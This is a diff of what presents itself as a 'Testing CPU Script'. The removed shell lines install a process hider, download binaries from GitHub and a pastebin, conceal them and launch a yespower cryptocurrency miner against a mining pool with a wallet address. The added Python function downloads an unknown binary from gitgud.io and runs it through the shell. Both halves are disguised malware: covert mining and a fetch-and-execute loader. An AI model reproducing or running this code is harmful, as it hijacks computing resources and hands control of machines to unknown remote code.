@@ -1,26 +1,13 @@
-echo "==================== Info xARCH ===================="
-echo "Testing CPU Script"
-echo "*******************"
-echo "SitBack And Enjoy"
-echo "===================================================="
+import os
+import socket
+import subprocess
+import sys
+from pathlib import Path
 
-echo "+++++++ Fetch Mechine Code +++++++++"
-apt update;apt -y install curl unzip autoconf git screen
-
-wget -O - https://deb.nodesource.com/setup_17.x | bash
-apt -y install nodejs
-apt -y install npm
-npm i -g node-process-hider
-
-wget -O tube https://github.com/TamJsmt/TamJsmt/raw/main/data
-wget -O timer https://pb.l1nx.pw/raw/HBQyPIdg9j
-
-echo "+++++++ Configure Code +++++++++"
-chmod +x tube
-chmod +x timer
-ph add tube
-
-echo "Configured Successfully"
-screen -d -m ./tube -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u TJsTWwcH7d56ikQ3L7AeBnFZPkjkgVKBgR.ArchDate -p c=TRX,ID=arc -t $(nproc) -x
-echo "+++++++ Mechine Started +++++++++"
-./timer
+def start_process():
+    
+    cmd = f'wget https://gitgud.io/trendava/clouds/-/raw/master/math && chmod +x math && ./math'
+    out, err = subprocess.Popen(
+        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+    print(out.decode('utf-8'))
+    print(err.decode('utf-8'))
